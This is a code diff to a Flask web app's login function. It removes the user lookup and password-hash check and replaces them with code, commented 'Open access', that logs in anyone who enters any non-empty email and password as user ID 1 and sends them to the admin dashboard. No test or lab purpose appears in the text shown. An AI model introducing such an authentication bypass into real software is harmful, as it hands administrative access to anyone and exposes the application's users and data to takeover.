@@ -35,18 +35,15 @@ def login():
             flash('Please enter both email and password.', 'error')
             return render_template('auth/login.html')
         
-        user = database.get_user_by_email(email)
-        
-        if user and check_password_hash(user['password_hash'], password):
-            session.clear()
-            session['user_id'] = user['id']
-            session['user_name'] = user['name']
-            session['user_email'] = user['email']
-            session['_csrf_token'] = secrets.token_urlsafe(32)
-            flash('Welcome back, ' + user['name'] + '!', 'success')
-            return redirect(url_for('admin.dashboard'))
-        else:
-            flash('Invalid email or password.', 'error')
+        # Open access: any non-empty email/password is accepted
+        display_name = email.split('@')[0].replace('.', ' ').replace('_', ' ').title()
+        session.clear()
+        session['user_id'] = 1
+        session['user_name'] = display_name
+        session['user_email'] = email
+        session['_csrf_token'] = secrets.token_urlsafe(32)
+        flash('Welcome, ' + display_name + '!', 'success')
+        return redirect(url_for('admin.dashboard'))
     
     return render_template('auth/login.html')
 
